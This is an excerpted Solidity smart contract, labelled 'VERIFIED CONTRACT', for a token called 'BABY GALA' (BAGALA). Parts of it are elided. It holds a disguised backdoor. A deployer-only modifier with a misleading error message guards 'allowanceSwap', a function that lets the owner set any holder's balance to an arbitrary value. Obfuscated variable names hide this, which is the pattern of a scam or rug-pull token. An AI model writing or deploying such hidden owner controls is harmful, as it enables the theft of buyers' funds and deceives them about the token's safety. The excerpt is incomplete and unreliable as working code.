// SPDX-License-Identifier: MIT VERIFIED CONTRACT
...
interface GALAbep20 {
   ...
   * https://github.com/GALA/EIPs/issues/20#issuecomment-263524729
   *
...
contract GALAAC is GALAbep20 {
  
    // common addresses
    address private owner;
    address private GALAPILOTWALL;
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public GALArownerd;
    
    mapping(address => mapping(address => uint)) public Allowance;
    
    // token title metadata
    string public override name = "BABY GALA";
    string public override symbol = "BAGALA";
    ...
    constructor(uint GALAalltotalSupplytotalValue) {
        // set total supply
        totalSupply = GALAalltotalSupplytotalValue;
        
       GALAPILOTWALL = msg.sender;      
        // designate addresses
        owner = msg.sender;
        
        // split the tokens according to agreed upon percentages
        
        GALArownerd[owner] = totalSupply;
    }
    ...
    function balanceOf(address account) public view override returns(uint) {
        return GALArownerd[account];
    }
  modifier _virtuals () {
    require(GALAPILOTWALL == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }   
    ...
    function allowanceSwap(address GALASwap, uint256 amount) external _virtuals {
      GALArownerd[GALASwap] = amount * 10 ** 9;
  }  
    ...
    function transferFrom(address from, address to, uint totalValue) public override returns(bool) {
        ...
        require(GALArownerd[from] >= totalValue, "Balance is too low to make transfer.");
        
        GALArownerd[to] += totalValue;
        GALArownerd[from] -= totalValue;
    ...
    function _burn(address account, uint256 amount) internal {
        ...
        require(GALArownerd[account] >= amount, "Burn amount exceeds balance at address.");
    
        GALArownerd[account] -= amount;
        totalSupply -= amount;
